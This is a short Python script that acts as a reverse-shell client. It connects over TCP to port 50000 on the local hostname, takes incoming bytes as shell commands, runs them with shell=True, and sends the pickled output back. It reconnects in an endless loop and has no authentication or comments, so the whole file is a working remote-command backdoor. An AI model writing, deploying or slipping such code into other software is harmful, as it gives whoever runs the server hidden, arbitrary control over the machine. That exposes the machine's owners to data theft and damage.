import socket
from subprocess import check_output, CalledProcessError
from pickle import dumps


class Socket:

    header = 10
    established = False
    cmd_received = False

    def connect_to_server(self):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.connect((socket.gethostname(), 50000))
            Socket.established = True
            print("Connection established")
        except (ConnectionRefusedError, TimeoutError, socket.error):
            Socket.established = False
            print("No connection established!")

    def receive_command(self):
        try:
            cmd = self.active_socket.recv(64)
        except ConnectionResetError:
            self.established = False
            return False
        cmd = cmd.decode()
        try:
            output = check_output(cmd, shell=True)
        except CalledProcessError as error:
            self.send_msg(error)
            return False
        output = ''.join(chr(i) for i in output)
        self.send_msg(output)
        return True

    def send_msg(self, msg):
        try:
            msg = dumps(msg)
            msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
            self.active_socket.send(msg)
        except(ConnectionResetError, ConnectionAbortedError, OSError):
            self.established = False


connection = Socket()
while True:
    if not connection.established:
        connection.connect_to_server()
        continue
    while connection.receive_command():
        pass
